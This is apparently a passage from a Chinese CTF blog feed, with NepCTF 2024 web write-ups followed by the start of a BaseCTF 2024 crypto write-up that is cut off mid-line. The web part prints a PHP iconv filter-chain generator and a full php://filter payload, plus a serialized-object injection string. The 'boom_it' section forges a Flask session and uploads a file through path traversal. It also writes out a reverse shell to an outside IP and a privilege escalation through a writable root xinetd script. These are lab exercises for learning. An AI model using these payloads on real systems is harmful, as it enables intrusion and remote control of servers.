class="hljs-string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;K&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;L&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,<br>    <span class="hljs-string">&#x27;M&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,<br>    <span class="hljs-string">&#x27;N&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;O&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;Q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;R&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,<br><span class="hljs-string">&#x27;S&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,<br>    <span class="hljs-string">&#x27;T&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,<br>    <span class="hljs-string">&#x27;X&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,<br><span class="hljs-string">&#x27;Z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,<br><span class="hljs-string">&#x27;j&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,<br>);<br><br><span class="hljs-variable">$filters</span> = <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$base64_payload</span>)) <span class="hljs-keyword">as</span> <span class="hljs-variable">$c</span>) &#123;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-variable">$conversions</span>[<span class="hljs-variable">$c</span>] . <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode&quot;</span>;<br><br><span class="hljs-variable">$final_payload</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">&#123;$filters&#125;</span>/resource=index.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$final_payload</span>;<br></code></pre></td></tr></table></figure><p>得到答案最后就是</p><p>Get传参</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;&amp;nep1=%f0abc%f0abc%f0abc%f0abc%9f%9f&amp;nep=Nep<br></code></pre></td></tr></table></figure><p>post传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php<br></code></pre></td></tr></table></figure><p>最后通过<code>?cmd=system(&#39;env&#39;);</code>得到flag</p><p><img src="/../../images/nepctf/2024/php4.png" alt="php4"></p><h2 id="蹦蹦炸弹（boom-it）"><a href="#蹦蹦炸弹（boom-it）" class="headerlink" title="蹦蹦炸弹（boom_it）"></a>蹦蹦炸弹（boom_it）</h2><p>审计一下代码，直接给了secret_key,用户是HRP，flask伪造session</p><p><img src="/../../images/nepctf/2024/boom1.png" alt="boom1"></p><p>随便写个前端上传个文件再修改一下内容为..&#x2F;..&#x2F;lock.txt</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://neptune-29348.nepctf.lemonprefect.cn/admin/dashboard&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>只有就有File uploaded successfully</p><p>然后改回GET，尝试?cmd&#x3D;ls</p><p><img src="/../../images/nepctf/2024/boom2.png" alt="boom2"></p><p>尝试读取flag发现并不能读取，发现start.sh可写入，尝试反弹shell</p><p><code>?cmd=echo+&quot;bash+-i+&gt;%26+/dev/tcp/8.130.42.113/8888+0&gt;%261&quot;+&gt;+start.sh</code></p><p><code>?cmd=bash+start.sh</code></p><p>进去发现是root权限才能读出</p><p><img src="/../../images/nepctf/2024/boom3.png" alt="boom3"></p><p>执行命令<code>ps -aux</code></p><p>可以看到一个<code>/usr/sbin/xinetd</code>是由root权限得到的</p><p>查看<code>etc/xinetd.d/</code>看到pwnservice里面有个端口8888,并且这个可以写入，可以尝试利用8888进行连接</p><p>这里继续看晨曦师傅的wp</p><p>我是需要<code>echo &quot;./pwn;chmod 777 /home/ctfuser/*&quot; &gt;&gt; /home/ctfuser/start.sh&quot;</code>这里改为最大权限</p><p>然后nc 127.0.0.1 8888,(<code>python3 -c &quot;import socket;sock = socket.socket();sock.connect((&#39;127.0.0.1&#39;, 8888));&quot;</code>)随后<code>ls -al</code>可以发现flag是可以打开的了，可以cat flag</p><p><img src="/../../images/nepctf/2024/boom4.png" alt="boom4"></p><hr><p>复盘就到这了，剩下的有些知识点确实完全不知道，等下学期好好恶补一下，第一次打nep学到了很多东西。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>Misc</tag>
      
      <tag>serialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basectf2024</title>
    <link href="/2024/08/21/basectf/basectf2024/"/>
    <url>/2024/08/21/basectf/basectf2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="hello-crypto"><a href="#hello-crypto" class="headerlink" title="hello_crypto"></a>hello_crypto</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Cipher import AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding import unpad<br><br><span class="hljs-comment"># 已知的 key1 和密文</span><br>key1 = 208797759953288399620324890930572736628<br>ciphertext = b<span class="hljs-string">&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br><br><span class="hljs-comment"># 将 key1 转换为字节格式</span><br>key = long_to_bytes(key1)<br><br><span class="hljs-comment"># 创建 AES 解密器</span><br>my_aes = AES.new(<span class="hljs-attribute">key</span>=key, <span class="hljs-attribute">mode</span>=AES.MODE_ECB)<br><br><span class="hljs-comment"># 解密并去除填充</span><br>decrypted_data = unpad(my_aes.decrypt(ciphertext), AES.block_size)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_data)<br></code></pre></td></tr></table></figure><h3 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 已知的 n, not_phi 和 c</span><br>n = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br>not_phi = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br>c = <span class="hljs-number">37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># Step 1: 从 n 和 not_phi 计算出 